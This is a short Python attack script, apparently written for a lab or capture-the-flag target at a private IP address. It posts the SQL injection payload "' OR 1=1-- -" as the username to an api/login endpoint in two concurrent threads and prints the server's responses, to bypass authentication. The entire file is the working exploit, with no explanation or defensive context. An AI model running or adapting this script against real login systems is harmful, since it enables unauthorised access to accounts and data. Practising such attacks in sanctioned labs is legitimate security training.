```
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep
from urllib.parse import urljoin

def send_request(url, data, number):
    try:
        r = requests.post(
            urljoin(url, "api/login"),
            data=data,
            timeout=5
        )
        print(f"[*] Request {number + 1}")
        print(r.text)
    except requests.RequestException as e:
        print(f"[!] Request {number + 1} failed: {e}")

def main():
    url = "http://10.49.159.63"

    payload = "' OR 1=1-- -"

    data = {
        "username": payload,
        "password": "test"
    }

    threads = []

    for number in range(2):
        t = Thread(target=send_request, args=(url, data, number))
        t.start()
        threads.append(t)
        sleep(0.1)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
```
